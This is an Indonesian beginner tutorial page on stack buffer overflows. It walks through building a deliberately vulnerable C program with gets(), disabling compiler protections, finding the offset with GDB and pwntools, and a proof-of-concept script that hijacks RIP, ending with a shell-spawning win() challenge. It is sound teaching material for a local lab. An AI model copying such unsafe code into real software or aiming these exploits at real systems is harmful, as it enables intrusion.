@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  
+  <style>
+    body {
+      background-color: #2e2e2e;
+      color: #c7c5c5;;
+      
+      font-family: 'Mono', sans-serif;  
+    }
+
+
+    a {
+      color: #48a874;  
+      text-decoration: none;
+    }
+
+    a:hover {
+      color: darkgray;  
+    }
+
+    a:visited {
+      color: #48a874;  
+    }
+
+    .fa {
+      font-family: "Font Awesome 6 Free", sans-serif;  
+      font-weight: 30px;
+    }
+  </style>
+
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">
+
+  
+  
+    <meta name="description" content="
+🔥 Pendahuluan
+PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
+
+🛠 1. Persiapan Lab Environment
+
+A. Sistem Operasi dan Tools Dasar
+Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
+sudo apt update
+sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
+Penjelasan Tools:">
+  
+
+  <title>
+    
+      Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.79e24f63ac05ef51117de1a7065e5243b91e09c98aab7a3cc4097fb39ce9d40148298c665a62632a4043c5aa8d2c0c8826a711f9d7d46f1af3e37ec3178a2d07.css" integrity="sha512-eeJPY6wF71ERfeGnBl5SQ7keCcmKq3o8xAl/s5zp1AFIKYxmWmJjKkBDxaqNLAyIJqcR&#43;dfUbxrz437DF4otBw==" />
+
+  
+  
+
+  
+    <meta name="description" content="
+🔥 Pendahuluan
+PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
+
+🛠 1. Persiapan Lab Environment
+
+A. Sistem Operasi dan Tools Dasar
+Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
+sudo apt update
+sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
+Penjelasan Tools:">
+    <meta property="og:description" content="
+🔥 Pendahuluan
+PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
+
+🛠 1. Persiapan Lab Environment
+
+A. Sistem Operasi dan Tools Dasar
+Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
+sudo apt update
+sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
+Penjelasan Tools:">
+    <meta property="og:image" content="/images/cuteheker.jpeg">
+    <meta name="twitter:image" content="/images/cuteheker.jpeg">
+
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="/posts/buffer-overflow/">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development">
+  <meta name="twitter:description" content="
+🔥 Pendahuluan
+PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
+
+🛠 1. Persiapan Lab Environment
+
+A. Sistem Operasi dan Tools Dasar
+Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
+sudo apt update
+sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
+Penjelasan Tools:">
+</head>
+
+
+
+
+
+
+
+
+
+
+
+<body a="black">
+
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~ $ cd /home</a>
+
+
+<article>
+    <p class="post-meta">
+    </p>
+
+<h1>Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development<br><br>
+    <small datetime="2025-08-11 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
+        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
+        2025-08-11 - Rainhynn
+    </small>
+</h1>
+
+    
+
+    <p><img src="https://i.ibb.co.com/hRyZnWQm/images-3.jpg" alt="PWN THUMB"></p>
+<h2 id="-pendahuluan">🔥 Pendahuluan</h2>
+<p>PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari <strong>nol</strong> sampai bisa membuat <strong>proof-of-concept buffer overflow</strong> dengan penjelasan mendetail untuk pemula.</p>
+<hr>
+<h2 id="-1-persiapan-lab-environment">🛠 1. Persiapan Lab Environment</h2>
+<p><img src="https://i.ibb.co.com/NgtWGDdw/images-2.jpg" alt="PWN Header"></p>
+<h3 id="a-sistem-operasi-dan-tools-dasar">A. Sistem Operasi dan Tools Dasar</h3>
+<p>Kita akan menggunakan <strong>Linux</strong> (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update
+</span></span><span style="display:flex;"><span>sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
+</span></span></code></pre></div><p><strong>Penjelasan Tools:</strong></p>
+<ul>
+<li><code>build-essential</code>: Untuk kompilasi program C (termasuk GCC)</li>
+<li><code>gdb</code>: Debugger untuk analisis binary</li>
+<li><code>gdb-multiarch</code>: Debugger yang support multi-architecture</li>
+</ul>
+<h3 id="b-install-pwntools">B. Install Pwntools</h3>
+<p>Pwntools adalah framework Python untuk eksploitasi binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip3 install pwntools
+</span></span></code></pre></div><p><strong>Fitur Penting Pwntools:</strong></p>
+<ul>
+<li>Membuat payload secara dinamis</li>
+<li>Berinteraksi dengan proses/program</li>
+<li>Analisis core dump</li>
+<li>Bekerja dengan berbagai architecture</li>
+</ul>
+<h3 id="c-matikan-proteksi-keamanan-untuk-pembelajaran">C. Matikan Proteksi Keamanan (Untuk Pembelajaran)</h3>
+<p>Di dunia nyata, binary memiliki berbagai proteksi. Untuk belajar, kita matikan dulu:</p>
+<ul>
+<li><strong>Stack Canary</strong>: Deteksi buffer overflow</li>
+<li><strong>PIE (Position Independent Executable)</strong>: Alamat memory yang random</li>
+<li><strong>NX (No-Execute)</strong>: Mencegah eksekusi code di stack</li>
+</ul>
+<hr>
+<h2 id="-2-membuat-program-vulnerable">📜 2. Membuat Program Vulnerable</h2>
+<p>Buat file <code>vuln.c</code> dengan kode berikut:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">10</span>]; <span style="color:#0f0">// Buffer hanya 10 byte
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Input: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buf); <span style="color:#0f0">// Fungsi berbahaya! Tidak ada batasan input
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;You entered: %s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="kompilasi-program">Kompilasi Program</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc vuln.c -o vuln -fno-stack-protector -no-pie -g
+</span></span></code></pre></div><p><strong>Flag Kompilasi:</strong></p>
+<ul>
+<li><code>-fno-stack-protector</code>: Matikan stack canary</li>
+<li><code>-no-pie</code>: Buat alamat fungsi tetap (tidak random)</li>
+<li><code>-g</code>: Tambahkan simbol debug untuk GDB</li>
+</ul>
+<hr>
+<h2 id="-3-analisis-binary-dengan-checksec">🔍 3. Analisis Binary dengan Checksec</h2>
+<p>Cek proteksi binary menggunakan <code>checksec</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checksec --file=./vuln
+</span></span></code></pre></div><p><strong>Output Contoh:</strong></p>
+<pre tabindex="0"><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre><p><strong>Interpretasi:</strong></p>
+<ul>
+<li><strong>No canary</strong>: Bisa overflow stack tanpa deteksi</li>
+<li><strong>No PIE</strong>: Alamat fungsi predictable</li>
+<li><strong>NX enabled</strong>: Stack tidak bisa dieksekusi (butuh ROP nanti)</li>
+</ul>
+<hr>
+<h2 id="-4-debugging-dengan-gdb">🧠 4. Debugging dengan GDB</h2>
+<h3 id="langkah-dasar-gdb">Langkah Dasar GDB</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./vuln
+</span></span></code></pre></div><p><strong>Perintah GDB Penting:</strong></p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">(gdb) break vuln       # Set breakpoint di fungsi vuln
+(gdb) run             # Jalankan program
+(gdb) info registers  # Lihat nilai register
+(gdb) x/20wx $rsp     # Lihat 20 word di stack pointer
+</code></pre><h3 id="eksperimen-crash">Eksperimen Crash</h3>
+<ol>
+<li>Jalankan program di GDB</li>
+<li>Ketika diminta input, masukkan <code>AAAAAAAAAAAAAAAAAAAA</code> (20 karakter &lsquo;A&rsquo;)</li>
+<li>Program akan crash dengan error <code>Segmentation fault</code></li>
+</ol>
+<p><strong>Analisis:</strong></p>
+<ul>
+<li>Register <code>RIP</code> akan berisi <code>0x414141414141</code> (&lsquo;AAAA&rsquo; dalam hex)</li>
+<li>Artinya kita berhasil menimpa return address!</li>
+</ul>
+<hr>
+<h2 id="-5-mencari-offset-dengan-pwntools">🧮 5. Mencari Offset dengan Pwntools</h2>
+<p>Kita perlu tahu <strong>berapa byte</strong> sampai mencapai return address. Gunakan script berikut:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>payload = cyclic(<span style="color:#f60">50</span>)  <span style="color:#0f0"># Generate pattern unik</span>
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>p.wait()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>core = p.corefile
+</span></span><span style="display:flex;"><span>rip_value = core.rip
+</span></span><span style="display:flex;"><span>offset = cyclic_find(rip_value)
+</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Offset ke return address: </span><span style="color:#87ceeb">{</span>offset<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span></code></pre></div><p><strong>Contoh Output:</strong></p>
+<pre tabindex="0"><code>Offset ke return address: 18
+</code></pre><p><strong>Penjelasan:</strong></p>
+<ul>
+<li><code>cyclic(50)</code> membuat pattern seperti <code>aaaabaaacaaadaaa...</code></li>
+<li>Ketika program crash, kita cari bagian pattern yang mengisi RIP</li>
+<li><code>cyclic_find</code> menghitung berapa byte sampai ke titik itu</li>
+</ul>
+<hr>
+<h2 id="-6-membuat-proof-of-concept-exploit">🚀 6. Membuat Proof-of-Concept Exploit</h2>
+<p>Setelah tahu offset, kita bisa kontrol RIP. Contoh script exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binary = <span style="color:#87ceeb">&#34;./vuln&#34;</span>
+</span></span><span style="display:flex;"><span>p = process(binary)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">18</span>
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span>*offset + p64(<span style="color:#f60">0xdeadbeef</span>)  <span style="color:#0f0"># Isi RIP dengan 0xdeadbeef</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div><p><strong>Hasil yang Diharapkan:</strong></p>
+<pre tabindex="0"><code>$ python3 exploit.py
+[+] Starting local process &#39;./vuln&#39;: pid 1234
+[*] Switching to interactive mode
+Input: You entered: AAAAAAAAAAAAAAAAAA�
+[*] Got EOF while reading in interactive
+[!] Process &#39;./vuln&#39; crashed with signal SIGSEGV
+</code></pre><p>Cek di GDB, register RIP sekarang bernilai <code>0xdeadbeef</code>!</p>
+<hr>
+<h2 id="-7-roadmap-belajar-pwn-fundamental">📈 7. Roadmap Belajar PWN Fundamental</h2>
+<p>Berikut alur belajar yang saya rekomendasikan:</p>
+<ol>
+<li>
+<p><strong>Memory Layout</strong>:</p>
+<ul>
+<li>Stack, heap, data segment</li>
+<li>Cara program menggunakan memory</li>
+</ul>
+</li>
+<li>
+<p><strong>Buffer Overflow Dasar</strong>:</p>
+<ul>
+<li>Seperti yang kita lakukan di tutorial ini</li>
+<li>Memahami konsep stack frame</li>
+</ul>
+</li>
+<li>
+<p><strong>Redirection Control Flow</strong>:</p>
+<ul>
+<li>Arahkan return address ke fungsi <code>win()</code> dalam binary</li>
+<li>Contoh: <code>payload = b&quot;A&quot;*offset + p64(0x401152)</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Return-Oriented Programming (ROP)</strong>:</p>
+<ul>
+<li>Bypass NX dengan ROP chain</li>
+<li>Gabungkan gadget-gadget yang ada</li>
+</ul>
+</li>
+<li>
+<p><strong>Format String Exploit</strong>:</p>
+<ul>
+<li>Baca/tulis arbitrary memory</li>
+<li>Eksploitasi bug <code>printf</code></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="-tantangan-selanjutnya">🔜 Tantangan Selanjutnya</h2>
+<p>Mau lanjut ke level lebih advanced? Coba ini:</p>
+<ol>
+<li>Tambahkan fungsi <code>win()</code> yang print flag</li>
+<li>Eksploitasi untuk redirect eksekusi ke <code>win()</code></li>
+<li>Bypass NX dengan ROP untuk spawn shell</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">win</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Bersiaplah untuk tutorial part 2 dimana kita akan membahas:</p>
+<ul>
+<li>Membuat shellcode custom</li>
+<li>Teknik Return-Oriented Programming (ROP)</li>
+<li>Bypass mitigasi modern</li>
+</ul>
+<hr>
+<h2 id="-referensi-tambahan">📚 Referensi Tambahan</h2>
+<ul>
+<li><a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">LiveOverflow Binary Hacking Playlist</a></li>
+<li><a href="https://ctf101.org/binary-exploitation/overview/">CTF 101: Binary Exploitation</a></li>
+<li><a href="https://docs.pwntools.com/en/stable/">pwntools Documentation</a></li>
+</ul>
+<pre tabindex="0"><code>
+Tips untuk pembaca:
+1. Coba setiap step sendiri di virtual machine
+2. Ubah-ubah nilai dan lihat efeknya
+3. Gunakan GDB untuk inspect memory setelah crash
+4. Dokumentasikan setiap progress belajar kalian!
+</code></pre>
+</article>
+
+<hr>
+
+<p>© 2021-2025 HnvDie</p>
+<p>Powered By Hugo ᯓᡣ𐭩</p>
+
+
+
+            </div>
+        </main>
+    </body></html>
